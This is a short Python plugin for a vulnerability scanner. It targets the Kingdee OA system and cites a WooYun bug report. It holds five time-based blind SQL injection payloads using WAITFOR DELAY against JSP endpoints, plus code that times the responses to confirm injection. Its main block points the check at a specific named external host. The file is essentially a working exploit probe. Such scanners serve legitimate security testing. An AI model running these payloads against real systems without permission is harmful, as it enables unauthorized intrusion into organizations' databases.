#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = kingdee
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0136823

import time

def assign(service, arg):
    if service == 'kingdee_oa':
        return True, arg

def audit(arg):
    payloads = ["kingdee/Template/TemplateEdit.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20",
                "kingdee/Template/TemplateSave.jsp?FileName=1'%20WAITFOR%20DELAY%20'0:0:0'--%20",
                "kingdee/DocumentEdit.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&UserName=1",
                "kingdee/DocumentSave.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&Template=1&Subject=1&Author=1&FileDate=1&FileType=1&HTMLPath=1",
                "kingdee/DocumentShow.jsp?Template=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&UserName=1"
                ]
    for p in payloads:
        url1 = arg + p
        url2 = arg + p.replace("0:0:0","0:0:5")
        t1 = time.time()
        code1, head1, res1, err1, _1 = curl.curl2(url1)
        t2 = time.time()
        code2, head2, res2, err2, _2 = curl.curl2(url2)
        t3 = time.time()
        if code1!=0 and code2!=0 and t3 - t2 - t2 + t1 > 3:
            security_hole(url2 + "has time-based blind")

if __name__ == '__main__':
    from dummy import *
    audit(assign('kingdee_oa', 'http://oa.guanhao.com:8080/')[1])